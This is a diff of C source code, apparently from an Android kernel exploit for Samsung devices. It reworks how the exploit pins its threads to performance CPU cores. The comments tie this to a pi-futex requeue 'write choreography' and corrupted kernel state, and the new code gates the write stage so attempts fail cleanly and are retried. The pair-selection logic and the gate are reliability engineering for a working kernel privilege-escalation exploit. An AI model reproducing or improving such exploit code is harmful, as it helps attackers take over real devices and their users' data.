@@ -3,73 +3,116 @@
 
 #if defined(RMG_PIN_TEST_PRIME)
 int rmg_pinned_core = RMG_CORE_LITERAL;
+int rmg_consumer_core = RMG_CORE_LITERAL + 1;
 
-/*
- * One-shot choreography-core resolver for the pinning-test branch.
- * Preference order: X3 prime (cpu7) -> perf cluster high-to-low
- * (cpu6..cpu3) -> RMG_CORE_LITERAL fallback. Every candidate passes a
- * live trial-pin (Samsung restricted-core kernels answer EINVAL for the
- * reserved prime); the winning mask is restored immediately so startup
- * state is untouched. Called once from both entry points (preload
- * constructor and main()) BEFORE any exploit stage begins.
- */
-int rmg_resolve_pinned_core(void) {
+/* Trial-pin helper: may the calling task be pinned to cpu c right now?
+ * Restores the previous mask before returning. */
+static int rmg_trial_pin(int c) {
   cpu_set_t prev;
-  if (sched_getaffinity(0, sizeof(prev), &prev) == 0) {
-    static const int order[] = {7, 6, 5, 4, 3};
-    for (size_t i = 0; i < sizeof(order) / sizeof(order[0]); i++) {
-      int c = order[i];
-      if (!CPU_ISSET(c, &prev)) {
-        continue;
-      }
-      cpu_set_t want;
-      CPU_ZERO(&want);
-      CPU_SET(c, &want);
-      if (sched_setaffinity(0, sizeof(want), &want) == 0) {
-        sched_setaffinity(0, sizeof(prev), &prev);
-        rmg_pinned_core = c;
-        pr_info("pinning-test: choreography core resolved cpu=%d\n", c);
-        return c;
-      }
-    }
+  if (sched_getaffinity(0, sizeof(prev), &prev) != 0 ||
+      !CPU_ISSET(c, &prev)) {
+    return 0;
   }
-  return rmg_pinned_core;
+  cpu_set_t want;
+  CPU_ZERO(&want);
+  CPU_SET(c, &want);
+  if (sched_setaffinity(0, sizeof(want), &want) != 0) {
+    return 0;
+  }
+  sched_setaffinity(0, sizeof(prev), &prev);
+  return 1;
 }
 
 /*
- * Re-validate at pin time. Samsung PM may migrate the task into a cpuset
- * that excludes the prime between constructor-time resolution and the
- * attempt start (observed: resolver probe cpu7 OK, later pin EINVAL).
- * Walks the same preference order against the CURRENT mask and updates
- * the global so every later pin_to_core(CORE) lands on a legal core.
+ * Placement policy (2026-08-27 stability rework).
+ *
+ * Codegen is -mtune=cortex-a715 and the collision channel is perf-cluster
+ * calibrated (2048 pile-up, x5 threshold), so the choreography core must
+ * land on the A715 cluster (cpu3-6). The consumer thread needs its OWN
+ * core (CONSUMER_CORE, historically CORE+1) and both cores of the pair
+ * must be legally pinnable NOW: Samsung PM migrates tasks between cpusets
+ * mid-run (top-app 0-7 -> foreground 0-6 -> background 0-2), so a pair
+ * that was legal at constructor time can be revoked before the attempt.
+ *
+ * Preference: highest a715 core whose +1 neighbor is also legal
+ * (5->6, 4->5, 3->4), then any legal a715 core paired with any other
+ * legal perf core, then the LITTLE literal as last resort. The X3 prime
+ * (cpu7) is deliberately NOT preferred: firmware revokes it mid-run and
+ * it does not match the a715 tune (observed: resolved cpu=7, revalidated
+ * cpu=5, consumer pin cpu=6 EINVAL -> unpinned write stage -> panic).
  */
-int rmg_revalidate_pinned_core(void) {
+static int rmg_select_pair(const char *why) {
   cpu_set_t cur;
   if (sched_getaffinity(0, sizeof(cur), &cur) != 0) {
     return rmg_pinned_core;
   }
-  if (rmg_pinned_core >= 0 && rmg_pinned_core < AFFINITY_MAX_CPUS &&
-      CPU_ISSET(rmg_pinned_core, &cur)) {
-    return rmg_pinned_core;
-  }
-  static const int order[] = {7, 6, 5, 4, 3, 0};
-  for (size_t i = 0; i < sizeof(order) / sizeof(order[0]); i++) {
-    int c = order[i];
-    if (!CPU_ISSET(c, &cur)) {
-      continue;
-    }
-    cpu_set_t want;
-    CPU_ZERO(&want);
-    CPU_SET(c, &want);
-    if (sched_setaffinity(0, sizeof(want), &want) == 0) {
-      sched_setaffinity(0, sizeof(cur), &cur);
+  static const int pair_order[] = {5, 4, 3};
+  for (size_t i = 0; i < sizeof(pair_order) / sizeof(pair_order[0]); i++) {
+    int c = pair_order[i];
+    if (CPU_ISSET(c, &cur) && CPU_ISSET(c + 1, &cur) &&
+        rmg_trial_pin(c) && rmg_trial_pin(c + 1)) {
       rmg_pinned_core = c;
-      pr_info("pinning-test: revalidated core cpu=%d\n", c);
+      rmg_consumer_core = c + 1;
+      pr_info("pinning-test: %s core cpu=%d consumer cpu=%d\n",
+              why, c, c + 1);
       return c;
     }
   }
-  pr_info("pinning-test: no candidate core usable; leaving unpinned\n");
+  /* No adjacent pair available: any legal a715 core + any other legal
+   * perf core for the consumer. */
+  static const int core_order[] = {6, 5, 4, 3};
+  for (size_t i = 0; i < sizeof(core_order) / sizeof(core_order[0]); i++) {
+    int c = core_order[i];
+    if (!CPU_ISSET(c, &cur) || !rmg_trial_pin(c)) {
+      continue;
+    }
+    for (int k = 6; k >= 3; k--) {
+      if (k != c && CPU_ISSET(k, &cur) && rmg_trial_pin(k)) {
+        rmg_pinned_core = c;
+        rmg_consumer_core = k;
+        pr_info("pinning-test: %s core cpu=%d consumer cpu=%d (split pair)\n",
+                why, c, k);
+        return c;
+      }
+    }
+  }
+  /* Perf cluster unavailable: fall back to the LITTLE literal pair.
+   * The write-stage pin gate treats this as a clean attempt failure. */
+  rmg_pinned_core = RMG_CORE_LITERAL;
+  rmg_consumer_core = RMG_CORE_LITERAL + 1;
+  pr_info("pinning-test: %s no perf core usable; fallback literal cpu=%d\n",
+          why, RMG_CORE_LITERAL);
   return rmg_pinned_core;
+}
+
+int rmg_resolve_pinned_core(void) {
+  return rmg_select_pair("resolved");
+}
+
+/*
+ * Re-validate at attempt time. Samsung PM may migrate the task into a
+ * narrower cpuset between constructor-time resolution and the attempt
+ * (observed: resolver probe cpu7 OK, later pin EINVAL). Re-selects the
+ * pair against the CURRENT mask and updates both globals so every later
+ * pin_to_core(CORE) / pin_to_core(CONSUMER_CORE) lands on a legal core.
+ */
+int rmg_revalidate_pinned_core(void) {
+  return rmg_select_pair("revalidated");
+}
+
+/*
+ * Write-stage pin gate: the pi-futex write choreography must never run
+ * with an unpinned or LITTLE-misplaced consumer. Observed 2026-08-26:
+ * cpuset shrank mid-attempt, consumer pin hit EINVAL, the thread kept
+ * running unpinned, and the kernel consumed the corrupted requeue state
+ * at scheduler mercy -> kernel panic in ~50% of attempts. Returns 1 only
+ * when a perf-cluster consumer core is legally pinnable right now;
+ * callers fail the attempt CLEANLY (supervisor retries) instead of
+ * gambling with a panic.
+ */
+int rmg_pin_gate_ready(void) {
+  (void)rmg_select_pair("gate");
+  return rmg_consumer_core >= 3 && rmg_trial_pin(rmg_consumer_core);
 }
 #endif
 
